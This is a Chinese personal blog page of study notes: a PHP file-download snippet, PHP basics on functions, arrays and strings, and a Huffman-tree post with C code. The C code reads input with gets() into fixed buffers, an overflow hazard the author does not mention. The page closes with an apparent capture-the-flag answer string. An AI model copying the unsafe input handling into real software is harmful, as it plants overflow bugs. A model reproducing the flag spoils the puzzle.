<h3 id="4-文件下载"><a href="#4-文件下载" class="headerlink" title="4.文件下载"></a>4.文件下载</h3><pre><code>&lt;?php
if(!function_exists(&apos;finfo_open&apos;)){
    header(&apos;Content-type:text/html;charset=utf-8&apos;);
    exit(&apos;请先开启PHP扩展:fileinfo！&apos;);
}
$file=&apos;a.rar&apos;;
$fileinfo=finfo_open(FILEINFO_MIME_TYPE);
$mimeType=finfo_file($fileinfo,$file);
finfo_close($fileinfo);
//发送指定的文件MIME类型的头信息
header(&apos;Content-type:&apos;.$mimeType);
//指定下载文件的描述
header(&apos;Content-Disposition:attachment;filename=&apos;.basename($file));
//指定文件的大小
header(&apos;Content-Length:&apos;.filesize($file));
//读取文件内容至输出缓冲区,返回这个文件
readfile($file);
?&gt;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/04/17/php学习笔记（二）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/17/php学习笔记（二）/" itemprop="url">php学习笔记（二）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-17T10:48:30+08:00">
                2019-04-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-函数"><a href="#一-函数" class="headerlink" title="一.函数"></a>一.函数</h2><p>函数（function）是一段完成特定功能的已命名代码块。函数可以遵照参数完成特定的任务，并且可能返回一个值。</p>
<h3 id="1-自定义函数"><a href="#1-自定义函数" class="headerlink" title="1.自定义函数"></a>1.自定义函数</h3><h4 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h4><pre><code>function 函数名称（参数1 ,参数2=默认值 ,…）{

程序内容叙述(也叫函数体)；

return 返回值; //return语句将终止函数的执行

}
</code></pre><p><strong>另</strong>：函数的名称应该体现出它的功能，函数名可以是以字母或下划线开头后跟字母、下划线和数字。</p>
<h4 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h4><p><strong>函数只有在被调用时才会执行</strong>，函数被调用后开始执行函数体中代码，执行的过程是相对独立的，执行完后返回调用的位置继续向下执行。</p>
<h4 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h4><ol>
<li>函数可以有零个或多个参数</li>
<li>函数的参数可以为任意数据类型</li>
<li>函数的参数往往用来改变函数执行结果或执行行为</li>
</ol>
<h4 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h4><ol>
<li>return语句并不是必须的</li>
<li>默认情况下，函数的返回值为NULL</li>
<li>return语句将终止函数的执行</li>
</ol>
<h3 id="2-变量范围"><a href="#2-变量范围" class="headerlink" title="2.变量范围"></a>2.变量范围</h3><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>局部变量是在函数内定义的，它的作用域仅限于函数内部。</p>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>全局变量是在函数外定义的，它的作用域为从变量定义处开始到本程序的末尾。<strong>在php函数中无法直接使用全局变量，如果使用必须使用global声明变量。</strong></p>
<h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><p>静态变量是指在函数内部定义变量的时候使用static关键字来定义变量。</p>
<h3 id="3-参数传递"><a href="#3-参数传递" class="headerlink" title="3.参数传递"></a>3.参数传递</h3><p>在函数的形参中使用“&amp;“修饰的参数<br>在调用该函数时必须传入一个变量给这个参数，而不能传递一个具体的值。</p>
<pre><code>$i=100;

function test($a)
{

      echo  ++$a;

}

test($i);

echo $i;
</code></pre><h3 id="4-可变函数"><a href="#4-可变函数" class="headerlink" title="4.可变函数"></a>4.可变函数</h3><p>以一个变量的值作为函数名的函数</p>
<pre><code>function test()
   { 

   }
  $a=&apos;test&apos;;
  $a();
</code></pre><h3 id="5-递归函数"><a href="#5-递归函数" class="headerlink" title="5.递归函数"></a>5.递归函数</h3><p><strong>函数直接或间接调用函数本身</strong>，则该函数称为递归函数。<br>必须具备判断是否执行递归调用的条件。<br>终止函数的递归调用时，需把目前流程的主控权交回上一层函数执行。<br>函数递归调用最大的好处在于可以精简程序中繁杂重复调用程序。</p>
<pre><code>function fun($n){

   echo $n.&apos;&amp;nbsp;&apos;;

   if($n&gt;0){          
     fun($n-1);

    }else{

      echo  &apos;&lt;br/&gt;&apos;;

    } 

    echo $n.&apos;&amp;nbsp; &apos; ;    

}

fun(3);
</code></pre><h3 id="6-内部函数"><a href="#6-内部函数" class="headerlink" title="6.内部函数"></a>6.内部函数</h3><p>php有很多提供给我们现成的函数或结构。<br>比如：</p>
<pre><code>echo()
include()
include_once()
require()
</code></pre><h2 id="二-数组"><a href="#二-数组" class="headerlink" title="二.数组"></a>二.数组</h2><h3 id="1-理解与创建"><a href="#1-理解与创建" class="headerlink" title="1.理解与创建"></a>1.理解与创建</h3><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>数组是php中的重要数组类型之一，是复合类型;<br>数据的集合，在php中数组是一个有序映射.</p>
<h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p><strong>法一</strong>：</p>
<pre><code>变量名称[索引值]=数据；
变量名称[]=数据；//不写索引值默认是索引数组，从零开始
</code></pre><p><strong>法二</strong>：</p>
<pre><code>变量名称=array(
索引值=&gt;数据，
........
)；
</code></pre><h3 id="2-遍历数组"><a href="#2-遍历数组" class="headerlink" title="2.遍历数组"></a>2.遍历数组</h3><p><strong>for循环</strong><br>用的比较少，因为有缺陷。<br><strong>通过foreach遍历数组</strong></p>
<pre><code>foreach($数组名称 as $变量名称){循环体;};
foreach($数组名称 as 变量1=&gt;变量2){循环体;}；
</code></pre><h3 id="3-预定义超全局数组"><a href="#3-预定义超全局数组" class="headerlink" title="3.预定义超全局数组"></a>3.预定义超全局数组</h3><p>预定义：已经定义好的变量（存放的数据的类型是数组）。</p>
<p>超全局：超级全局变量，作用域（有效区域）。</p>
<p>传递数据（提交数据）给服务器端主要两种方式：</p>
<p><strong>get方式</strong></p>
<p>?参数名=参数值&amp;参数名=参数值……</p>
<p>在服务器端（请求的php文件这边）可以通过$_GET来获取到<br><strong>post方式</strong><br>比如表单post发送过来的一般用$_POST来获取</p>
<h3 id="4-处理数组的相关函数"><a href="#4-处理数组的相关函数" class="headerlink" title="4.处理数组的相关函数"></a>4.处理数组的相关函数</h3><p>相关函数我们可以通过查手册来使用：<br><a href="https://www.php.net/manual/zh/ref.array.php" target="_blank" rel="noopener">数组的相关函数</a></p>
<h2 id="三-字符串处理"><a href="#三-字符串处理" class="headerlink" title="三.字符串处理"></a>三.字符串处理</h2><h3 id="1-去除空白或其他字符函数"><a href="#1-去除空白或其他字符函数" class="headerlink" title="1.去除空白或其他字符函数"></a>1.去除空白或其他字符函数</h3><p> <strong>trim(）</strong></p>
<pre><code>trim($字符串名称,&quot;char&quot;);
</code></pre><p>char为你要去除的字符，如果省略，就是去除首尾的空白</p>
<p><strong>ltrim()去除字符串左边的字符或空白</strong></p>
<p><strong>rtrim()去除字符串右边的字符或空白</strong></p>
<h3 id="2-大小写转换函数"><a href="#2-大小写转换函数" class="headerlink" title="2.大小写转换函数"></a>2.大小写转换函数</h3><p><strong>strtoupper()将字符串转化为大写</strong> </p>
<pre><code>strtoupper($字符串名称);
</code></pre><p><strong>strtolower()将字符串转化为小写</strong></p>
<pre><code>strtolower($字符串名称);
</code></pre><h3 id="3-字符串查找函数"><a href="#3-字符串查找函数" class="headerlink" title="3.字符串查找函数"></a>3.字符串查找函数</h3><p><strong>substr_count()计算字串出现的次数</strong></p>
<pre><code>substr_count($字符串,$needle);
substr_count($字符串,$needle,$offset,$length)

/*
needle(char)：要查找的字符或字符串
offset(int)：从第第几位开始查找（从0开始数）
length(int)：从开始查找的位置开始向后查多少位
该函数返回的是整型
*/
</code></pre><p><strong>strpos()查找字符串首次出现的位置</strong></p>
<pre><code>strpos($字符串名称,$needle)
strpos($字符串名称,$needle,$offset)

/*
needle(char)：要查找的字符或字符串
offset(int)：从第第几位开始查找（从0开始数）
该函数返回的值可能是整型，也可能是布尔类型的false（当返回的值为0时）
*/
</code></pre><p><strong>strstr()查找字符串的首次出现</strong></p>
<pre><code>strstr($字符串名称,$needle)
strstr($字符串名称,$needle,before_needle)

/*
needle(char)：要查找的字符或字符串
该函数返回字符串，该字符串为needle(char)及其后面的内容
before_needle：如果为true,则返回needle(char)之前的内容（不包括needle(char)）
*/
</code></pre><h3 id="4-字符串替换函数"><a href="#4-字符串替换函数" class="headerlink" title="4.字符串替换函数"></a>4.字符串替换函数</h3><p><strong>str_replace()子字符串替换</strong></p>
<pre><code>str_replace($search,$replace,$str)
str_replace($search,$replace,$str,$count)

/*
search(char)：要替换的字符
replace(char)：要替换成的字符
count(int)：替换的次数
也可以用数组一次替换多个字符
str_replace(array(&apos;c1&apos;,&apos;c2&apos;,&apos;c3&apos;),array(&apos;d1&apos;,&apos;d2&apos;,&apos;d3&apos;),$str)
str字符串中的c1,c2,c3会被替换成d1,d2,d3
该函数返回字符串
*/
</code></pre><h3 id="5-与html标签相关的函数"><a href="#5-与html标签相关的函数" class="headerlink" title="5.与html标签相关的函数"></a>5.与html标签相关的函数</h3><p>htmlspecialchars()//将特殊字符转换为html 实体<br>strip_tags()//从字符串中去除 html和 php 标记</p>
<h3 id="6-字符串截取函数"><a href="#6-字符串截取函数" class="headerlink" title="6.字符串截取函数"></a>6.字符串截取函数</h3><p><strong>substr()返回字符串的子串</strong></p>
<pre><code>substr($str,$start)
  substr($str,$start,$length)
  /*
  str：传入的字符串
  start(int)：从此处开始截取（从0开始数），若为负数则从尾开始数
  length(int)：返回的字符串的长度
  */
</code></pre><h3 id="7-字符串分隔函数"><a href="#7-字符串分隔函数" class="headerlink" title="7.字符串分隔函数"></a>7.字符串分隔函数</h3><p><strong>explode()使用一个字符串分割另一个字符串</strong></p>
<pre><code>explode($delimiter,$字符串名称)
explode($delimiter,$字符串名称,$limit)
/*
delimiter(char)：从此字符处分割
limit(int)：限制分割的次数，分割limit-1次
*/
</code></pre><p><strong>str_split()将字符串转换为数组</strong></p>
<pre><code>str_split($字符串名称,$split_length)
/*
split_length：每个转换成的数组中的元素有多少个字符
返回一个数组
*/
</code></pre><p><a href="https://www.php.net/manual/zh/book.strings.php" target="_blank" rel="noopener">字符串处理手册</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/04/14/数据结构之哈夫曼树/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/14/数据结构之哈夫曼树/" itemprop="url">数据结构之哈夫曼树</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-14T20:27:40+08:00">
                2019-04-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>给定n个权值作为n个叶子结点，构造一棵二叉树，若该树的<strong>带权路径长度达到最小</strong>，称这样的二叉树为最优二叉树，也称为哈夫曼树(Huffman Tree)。哈夫曼树是带权路径长度最短的树，权值较大的结点离根较近。<br>所谓<strong>树的带权路径长度</strong>，就是树中所有的叶结点的权值乘上其到根结点的路径长度（若根结点为0层，叶结点到根结点的路径长度为叶结点的层数）。树的路径长度是从树根到每一结点的路径长度之和，记为WPL=（W1<em>L1+W2</em>L2+W3<em>L3+…+Wn</em>Ln），N个权值Wi（i=1,2,…n）构成一棵有N个叶结点的二叉树，相应的叶结点的路径长度为Li（i=1,2,…n）。可以证明霍夫曼树的WPL是最小的。</p>
<h2 id="二-基本术语"><a href="#二-基本术语" class="headerlink" title="二.基本术语"></a>二.基本术语</h2><h3 id="1-路径和路径长度"><a href="#1-路径和路径长度" class="headerlink" title="1.路径和路径长度"></a>1.路径和路径长度</h3><p>在一棵树中，从一个结点往下可以达到的孩子或孙子结点之间的通路，称为路径。通路中分支的数目称为路径长度。若规定根结点的层数为1，则从根结点到第L层结点的路径长度为L-1。</p>
<h3 id="2-结点的权及带权路径长度"><a href="#2-结点的权及带权路径长度" class="headerlink" title="2.结点的权及带权路径长度"></a>2.结点的权及带权路径长度</h3><p>若将树中结点赋给一个有着某种含义的数值，则这个数值称为该结点的权。结点的带权路径长度为：从根结点到该结点之间的路径长度与该结点的权的乘积。</p>
<h3 id="3-树的带权路径长度"><a href="#3-树的带权路径长度" class="headerlink" title="3.树的带权路径长度"></a>3.树的带权路径长度</h3><p>树的带权路径长度规定为所有叶子结点的带权路径长度之和，记为WPL。</p>
<h2 id="三-构造"><a href="#三-构造" class="headerlink" title="三.构造"></a>三.构造</h2><p>假设有n个权值，则构造出的哈夫曼树有n个叶子结点。 n个权值分别设为 w1、w2、…、wn，则<strong>哈夫曼树的构造规则</strong>为：<br>(1) 将w1、w2、…，wn看成是有n 棵树的森林(每棵树仅有一个结点)；<br>(2) 在森林中选出两个根结点的权值最小的树合并，作为一棵新树的左、右子树，且新树的根结点权值为其左、右子树根结点权值之和；<br>(3)从森林中删除选取的两棵树，并将新树加入森林；<br>(4)重复(2)、(3)步，直到森林中只剩一棵树为止，该树即为所求得的哈夫曼树。<br><strong>图解过程</strong>：<img src="https://img-blog.csdnimg.cn/20190414200419768.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="四-编码"><a href="#四-编码" class="headerlink" title="四.编码"></a>四.编码</h2><p>利用哈夫曼树求得的二进制编码称为哈夫曼编码。树中从根到每个叶子节点都有一条路径，对路径上的各分支约定指向左子树的分支表示”0”码，指向右子树的分支表示“1”码，取每条路径上的“0”或“1”的序列作为各个叶子节点对应的字符编码，即是哈夫曼编码。</p>
<p>就拿上图例子来说：</p>
<p>A，B，C，D对应的哈夫曼编码分别为：111，10，110，0</p>
<p>用图说明如下：<br><img src="https://img-blog.csdnimg.cn/201904142010448.jpg" alt></p>
<h2 id="五-例题及代码实现"><a href="#五-例题及代码实现" class="headerlink" title="五.例题及代码实现"></a>五.例题及代码实现</h2><p><strong>例</strong>：<img src="https://img-blog.csdnimg.cn/20190414202118277.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br><strong>C++实现</strong>：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

typedef int ELEMTYPE;

   // 哈夫曼树结点结构体
   typedef struct HuffmanTree
   {
      ELEMTYPE weight;
      ELEMTYPE id;        // id用来主要用以区分权值相同的结点，这里代表了下标
      struct HuffmanTree* lchild;
      struct HuffmanTree* rchild;
  }HuffmanNode;

  // 构建哈夫曼树
  HuffmanNode* createHuffmanTree(int* a, int n)
  {
      int i, j;
      HuffmanNode **temp, *hufmTree;
      temp = malloc(n*sizeof(HuffmanNode));
      for (i = 0; i&lt;n; ++i)     // 将数组a中的权值赋给结点中的weight
      {
          temp[i] = (HuffmanNode*)malloc(sizeof(HuffmanNode));
          temp[i]-&gt;weight = a[i];
          temp[i]-&gt;id = i;
          temp[i]-&gt;lchild = temp[i]-&gt;rchild = NULL;
      }

      for (i = 0; i&lt;n - 1; ++i)       // 构建哈夫曼树需要n-1合并
      {
          int small1 = -1, small2;      // small1、small2分别作为最小和次小权值的下标
          for (j = 0; j&lt;n; ++j)         // 先将最小的两个下标赋给small1、small2（注意：对应权值未必最小）
          {
              if (temp[j] != NULL &amp;&amp; small1 == -1)
              {
                  small1 = j;
                  continue;
              }
              else if (temp[j] != NULL)
              {
                  small2 = j;
                  break;
              }
          }

          for (j = small2; j&lt;n; ++j)    // 比较权值，挪动small1和small2使之分别成为最小和次小权值的下标
          {
              if (temp[j] != NULL)
              {
                  if (temp[j]-&gt;weight &lt; temp[small1]-&gt;weight)
                  {
                      small2 = small1;
                      small1 = j;
                  }
                  else if (temp[j]-&gt;weight &lt; temp[small2]-&gt;weight)
                  {
                      small2 = j;
                  }
              }
          }
         hufmTree = (HuffmanNode*)malloc(sizeof(HuffmanNode));
         hufmTree-&gt;weight = temp[small1]-&gt;weight + temp[small2]-&gt;weight;
         hufmTree-&gt;lchild = temp[small1];
         hufmTree-&gt;rchild = temp[small2];

         temp[small1] = hufmTree;
         temp[small2] = NULL;
     }
     free(temp);
     return hufmTree;
 }

 // 以广义表的形式打印哈夫曼树
 void PrintHuffmanTree(HuffmanNode* hufmTree)
 {
     if (hufmTree)
     {
         printf(&quot;%d&quot;, hufmTree-&gt;weight);
         if (hufmTree-&gt;lchild != NULL || hufmTree-&gt;rchild != NULL)
         {
             printf(&quot;(&quot;);
             PrintHuffmanTree(hufmTree-&gt;lchild);
             printf(&quot;,&quot;);
             PrintHuffmanTree(hufmTree-&gt;rchild);
             printf(&quot;)&quot;);
         }
     }
 }

 // 递归进行哈夫曼编码
 void HuffmanCode(HuffmanNode* hufmTree, int depth)      // depth是哈夫曼树的深度
 {
     static int code[100];
     if (hufmTree)
     {
         if (hufmTree-&gt;lchild == NULL &amp;&amp; hufmTree-&gt;rchild == NULL)
         {
             printf(&quot;id为%d权值为%d的叶子结点的哈夫曼编码为 &quot;, hufmTree-&gt;id, hufmTree-&gt;weight);
             int i;
             for (i = 0; i&lt;depth; ++i)
             {
                 printf(&quot;%d&quot;, code[i]);
             }
             printf(&quot;\n&quot;);
         }
         else
         {
             code[depth] = 0;
             HuffmanCode(hufmTree-&gt;lchild, depth + 1);
             code[depth] = 1;
             HuffmanCode(hufmTree-&gt;rchild, depth + 1);
         }
     }
 }

 // 哈夫曼解码
 void HuffmanDecode(char ch[], HuffmanNode* hufmTree, char string[])     // ch是要解码的01串，string是结点对应的字符
 {
     int i;
     int num[500];
     HuffmanNode* tempTree = NULL;
     for (i = 0; i&lt;strlen(ch); ++i)
     {
         if (ch[i] == &apos;0&apos;)
             num[i] = 0;
         else
             num[i] = 1;
     }
     if (hufmTree)
     {
         i = 0;      // 计数已解码01串的长度
         while (i&lt;strlen(ch))
         {
             tempTree = hufmTree;
             while (tempTree-&gt;lchild != NULL &amp;&amp; tempTree-&gt;rchild != NULL)
             {
                 if (num[i] == 0)
                 {
                     tempTree = tempTree-&gt;lchild;
                 }
                 else
                 {
                     tempTree = tempTree-&gt;rchild;
                 }
                 ++i;
             }
             printf(&quot;%c&quot;, string[tempTree-&gt;id]);     // 输出解码后对应结点的字符
         }
     }
 }

 int main()
 {
     int i, n;
     printf(&quot;请输入叶子结点的个数：\n&quot;);
     while (1)
     {
         scanf(&quot;%d&quot;, &amp;n);
         if (n&gt;1)
             break;
         else
             printf(&quot;输入错误，请重新输入n值！&quot;);
     }

     int* arr;
     arr = (int*)malloc(n*sizeof(ELEMTYPE));
     printf(&quot;请输入%d个叶子结点的权值：\n&quot;, n);
     for (i = 0; i&lt;n; ++i)
     {
         scanf(&quot;%d&quot;, &amp;arr[i]);
     }

     char ch[500], string[500];
     printf(&quot;请连续输入这%d个叶子结点各自所代表的字符：\n&quot;, n);
     fflush(stdin);      // 强行清除缓存中的数据，也就是上面输入权值结束时的回车符
     gets(string);

     HuffmanNode* hufmTree = NULL;
     hufmTree = createHuffmanTree(arr, n);

     printf(&quot;此哈夫曼树的广义表形式为：\n&quot;);
     PrintHuffmanTree(hufmTree);
     printf(&quot;\n各叶子结点的哈夫曼编码为：\n&quot;);
     HuffmanCode(hufmTree, 0);

     printf(&quot;要解码吗？请输入编码:\n&quot;);
     gets(ch);
     printf(&quot;解码结果为：\n&quot;);
     HuffmanDecode(ch, hufmTree, string);
     printf(&quot;\n&quot;);

     free(arr);
     free(hufmTree);

     return 0;
 }
</code></pre><p><strong>结果</strong> ：<img src="https://img-blog.csdnimg.cn/20190414202446949.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>这里结果只用改一下就好</p>
<pre><code>f}alg55fd5f50f0ddd0d00adafdd5505d50a5{
flag{ddf5dfd0f05550500a5af55dd0d5d0ad}
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">yxld</p>
              <p class="site-description motion-element" itemprop="description">支撑一个人走完漫长一生的，是喜爱、擅长与心甘情愿</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yxld</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
